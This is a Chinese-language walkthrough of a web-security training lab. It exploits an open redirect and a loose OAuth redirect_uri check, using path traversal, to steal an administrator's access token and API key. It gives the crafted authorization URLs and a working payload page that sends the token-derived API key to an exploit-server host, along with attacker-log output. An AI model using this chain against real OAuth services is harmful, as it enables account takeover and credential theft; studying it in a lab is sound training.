# 实验：通过开放重定向窃取 OAuth 访问令牌

本实验使用 OAuth 服务允许用户使用其社交媒体账户登录。OAuth 服务的验证存在缺陷，使得攻击者能够将访问令牌泄露到客户端应用程序上的任意页面。

要解决本实验，请识别博客网站上的开放重定向，并利用它窃取管理员用户账户的访问令牌。使用访问令牌获取管理员的 API 密钥，并使用实验横幅中提供的按钮提交解决方案。

> **注意：** 您无法通过简单地在客户端应用程序上登录管理员账户来访问管理员的 API 密钥。

管理员用户会打开您从 exploit server 发送的任何内容，并且他们始终与 OAuth 服务保持活动会话。

您可以使用以下凭据通过自己的社交媒体账户登录：`wiener:peter`。

## 步骤

探测账户 API
- 登录账户，访问账户页面
    ```html
    <div id=account-content>
        <p>
            Your username is: wiener
        </p>
        <p>
            Your email is: <span id="user-email">
            wiener@hotdog.com
            </span>
        </p>
        <div>
            Your API Key is: [hidden]
        </div>
        <br/>
    </div>
    ```
    - API 密钥无法从账户页面读取

- 查看之前的步骤，访问应用程序回调端点时
    ```http
    GET /oauth-callback HTTP/2
    Host: id.web-security-academy.net
    ```
    - 应用程序返回向授权服务器查询端点设置头部并进行账户查询的请求

        ```html
        <script>
            // 提取密钥
            const urlSearchParams = new URLSearchParams(window.location.hash.substr(1));
            const token = urlSearchParams.get('access_token');
            // 访问端点，使用密钥构建验证头部
            fetch('https://oauth-id.oauth-server.net/me', {
                    method: 'GET',
                    headers: {
                        'Authorization': 'Bearer ' + token,
                        'Content-Type': 'application/json'
                    }
                })
                // 端点返回账户信息
                .then(r => r.json())
                // 请求体发送选定账户信息
                .then(j =>
                    fetch('/authenticate', {
                        method: 'POST',
                        headers: {
                            'Accept': 'application/json',
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            email: j.email,
                            username: j.sub,
                            token: token
                        })
                    }).then(r => document.location = '/'))
        </script>
        ```

    - 访问授权服务器查询端点
        ```http
        GET /me HTTP/2
        Host: oauth-id.oauth-server.net
        Sec-Ch-Ua-Platform: "Windows"
        Authorization: Bearer UmkXllKD2U24uX5HANYOAB4fHYmKg9qpBsSZapTJD6M
        ```

    - 授权服务器返回账户信息
        ```json
        {
            "sub":"wiener",
            "apikey":"u9wXO18dL63QND8twQxCfsX95ted0Udu",
            "name":"Peter Wiener",
            "email":"wiener@hotdog.com",
            "email_verified":true
        }
        ```
        - 账户的 API 密钥在授权服务器返回的信息中

探测应用程序功能
- 访问文章详情
    ```http
    GET /post?postId=3 HTTP/2
    ```

    - 查看响应的 HTML 文件
        ```html
        <div class="is-linkback">
            <a href="/">
                Back to Blog
            </a>
            <a href="/post/next?path=/post?postId=4">
                | Next post
            </a>
        </div>
        ```
        - 此处的 next 端点可能有趣

- 访问 next 端点
    ```http
    GET /post/next?path=/post?postId=4 HTTP/2
    ```
    
    - 应用程序响应 302 重定向
        ```http
        HTTP/2 302 Found
        Location: /post?postId=4
        ```
        - 此处可能存在输入反射

- 测试 next 端点输入反射
    ```http
    GET /post/next?path=/post/foo/bar HTTP/2
    ```

    - 应用程序响应
        ```http
        HTTP/2 302 Found
        Location: /post/foo/bar
        ```
        - 确认开放重定向

攻击链
- 结构
    - next 端点参数设置到攻击者主机
    - 授权回调端点设置到同源的存在开放重定向的 next 端点  

- next 端点参数设置到攻击者主机
    `/post/next?path=//exploit-id.exploit-server.net/exploit`

- 获取应用程序使用客户端重定向到授权服务器的初始请求 URL
    `https://oauth-id.oauth-server.net/auth?client_id=gxy38bjm4t6nb87cc15zk&redirect_uri=https://id.web-security-academy.net/oauth-callback&response_type=token&nonce=45043946&scope=openid%20profile%20email`

- 修改回调端点为重定向漏洞端点 next
    `https://oauth-id.oauth-server.net/auth?client_id=gxy38bjm4t6nb87cc15zk&redirect_uri=https://id.web-security-academy.net/post/next%3fpath%3d%2f%2fexploit-id.exploit-server.net%2fexploit&response_type=token&nonce=45043946&scope=openid%20profile%20email`
    - 注意，此处使用 URL 编码 next 端点内容
    - 失败，响应为 URL 不匹配初始设置，尝试使用路径遍历
        `https://oauth-id.oauth-server.net/auth?client_id=gxy38bjm4t6nb87cc15zk&redirect_uri=https://id.web-security-academy.net/oauth-callback/../post/next%3fpath%3d%2f%2fexploit-id.exploit-server.net%2fexploit&response_type=token&nonce=45043946&scope=openid%20profile%20email`
        - 成功通过检测
        
- 设置载荷页面，此处仅修改应用程序的客户端 JS 代码
    ```html
    <script>
        if (!window.location.hash) {
            window.location= 'https://oauth-id.oauth-server.net/auth?client_id=gxy38bjm4t6nb87cc15zk&redirect_uri=https://id.web-security-academy.net/oauth-callback/../post/next%3fpath%3d%2f%2fexploit-id.exploit-server.net%2fexploit&response_type=token&nonce=45043946&scope=openid%20profile%20email';
        } else {
            x_func();
        }
        function x_func(){
            const urlSearchParams = new URLSearchParams(window.location.hash.substr(1));
            const token = urlSearchParams.get('access_token');
            fetch('https://oauth-id.oauth-server.net/me', {
                method: 'GET',
                headers: {
                'Authorization': 'Bearer ' + token,
                'Content-Type': 'application/json'
                }
            }
            )
            .then(r => r.json())
            .then(j => 
                fetch('/apikey?' + j.apikey)
            )
        }
    </script>
    ```
    - 使用顶级页面跳转更容易在浏览器观察哈希片段以调试

- 测试载荷页面，最终得到
    ```http
    GET /apikey?u9wXO18dL63QND8twQxCfsX95ted0Udu HTTP/2
    Host: exploit-id.exploit-server.net
    ```
    - 执行链成功

- 发送到受害者，查看攻击者服务器日志
    ```log
    10.0.3.198      2026-08-15 14:39:16 +0000 "GET /apikey?v5eXE8ukGCs3NSAD31xHP750uRatjZwj HTTP/1.1" 404 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36"
    ```
    - 得到受害者 apikey


假想：
- 使用 iframe 的 contentWindow 属性从父页面访问子框架的重定向后的 URL
- 或子框架内检索信息

## 示例解决方案

- 载荷链接中的回调端点 URL 不进行 URL 编码
- 载荷页面使用客户端顶级导航，提取 hash 片段字符串后设置为查询参数，跳转到当前页面。即，之前无法在 log 显示的 hash 片段转为查询参数
- 获取令牌后，手动构造验证头部，向查询端点请求账户信息
